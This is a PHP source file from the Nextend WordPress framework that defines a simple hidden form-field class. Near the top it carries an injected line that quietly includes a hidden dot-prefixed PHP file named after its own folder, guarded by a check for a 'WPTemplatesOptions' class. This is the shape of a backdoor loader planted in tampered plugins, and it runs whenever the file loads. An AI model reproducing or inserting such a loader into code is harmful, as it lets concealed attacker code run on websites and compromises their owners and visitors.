<?php


namespace Nextend\Framework\Form\Element;


if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class Hidden extends AbstractFieldHidden {

    protected $hasTooltip = false;

    public function __construct($insertAt, $name = '', $default = '', $parameters = array()) {
        parent::__construct($insertAt, $name, false, $default, $parameters);
    }

    public function getRowClass() {
        return 'n2_form_element--hidden';
    }
}